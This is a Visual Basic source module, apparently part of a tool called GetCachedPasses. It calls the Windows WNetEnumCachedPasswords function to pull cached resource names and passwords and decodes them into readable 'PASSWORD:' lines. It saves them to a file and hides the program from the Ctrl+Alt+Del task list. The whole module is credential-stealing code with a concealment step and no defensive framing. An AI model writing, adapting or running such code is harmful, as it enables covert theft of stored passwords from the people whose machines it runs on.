Attribute VB_Name = "GetPassesModule2"
Declare Function WNetEnumCachedPasswords Lib "mpr.dll" (ByVal s As String, ByVal i As Integer, ByVal b As Byte, ByVal proc As Long, ByVal l As Long) As Long
   Type PASSWORD_CACHE_ENTRY
    cbEntry As Integer 'size of this returned structure in bytes
    cbResource As Integer 'size of the resource string, in bytes
    cbPassword As Integer 'size of the password string, in bytes
    iEntry As Byte 'entry position In PWL file
    nType As Byte 'type of entry
    abResource(1 To 1024) As Byte 'buffer to hold resource string, followed by password string
    'should this be bigger?
    End Type
    'The main routines

Public Function callback(X As PASSWORD_CACHE_ENTRY, ByVal lSomething As Long) As Integer
    Dim nLoop As Integer
    Dim cString As String
    Dim ccomputer
    Dim Resource As String
    Dim ResType As String
    Dim Password As String
    ResType = X.nType
    For nLoop = 1 To X.cbResource
        If X.abResource(nLoop) <> 0 Then
            cString = cString & Chr(X.abResource(nLoop))
        Else
            cString = cString & " "
        End If
    Next
    Resource = cString
    'cString = cString & " Pwd: "
    cString = ""
    For nLoop = X.cbResource + 1 To (X.cbResource + X.cbPassword)
        If X.abResource(nLoop) <> 0 Then
            cString = cString & Chr(X.abResource(nLoop))
        Else
            cString = cString & " "
        End If
    Next
    Password = cString
    cString = ""
    GetCachedPasses.List1.AddItem " " & Resource & " PASSWORD: " & Password
        callback = True
    End Function
Public Sub GetPasswords()
    Dim nLoop As Integer
    Dim cString As String
    Dim lLong As Long
    Dim bByte As Byte
    bByte = &HFF
    nLoop = 0
    lLong = 0
    cString = ""
    Call WNetEnumCachedPasswords(cString, nLoop, bByte, AddressOf callback, lLong)
End Sub
Sub Save_ListBox(Path As String, Lst As ListBox)
    Dim Listz As Long
    On Error Resume Next

    Open Path$ For Output As #1
    For Listz& = 0 To Lst.ListCount - 1
        Print #1, Lst.List(Listz&)
        Next Listz&
    Close #1
End Sub

Public Sub HideCtrlAltDel()
'Hide this app from Ctrl + Alt + Del
On Error GoTo error
App.TaskVisible = False
Exit Sub
error:  MsgBox Err.Description, vbExclamation, "Error"
End Sub
